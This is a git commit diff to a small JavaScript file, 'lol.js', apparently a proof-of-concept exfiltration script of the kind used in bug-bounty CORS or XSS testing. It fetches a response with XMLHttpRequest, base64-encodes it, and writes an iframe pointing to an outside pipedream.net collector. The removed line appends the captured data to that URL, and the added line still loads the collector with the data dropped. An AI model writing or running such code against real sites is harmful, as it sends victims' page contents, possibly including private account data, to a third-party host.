136b0fe99cf724825836158cf2e21e2c4e972613
h4rsh4d <harshadgaikwad77@gmail.com>
2022-08-13 18:01:24 +0530

    Update lol.js

--- lol.js
+++ lol.js
@@ -2,7 +2,7 @@ function reqListener () {
     var encoded = encodeURI(this.responseText);
     var b64 = btoa(this.responseText);
     var raw = this.responseText;
-    document.write('<iframe src="https://ene6fjjn4cshw.x.pipedream.net/?data='+b64+'"></iframe>');
+    document.write('<iframe src="https://ene6fjjn4cshw.x.pipedream.net/?data="></iframe>');
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
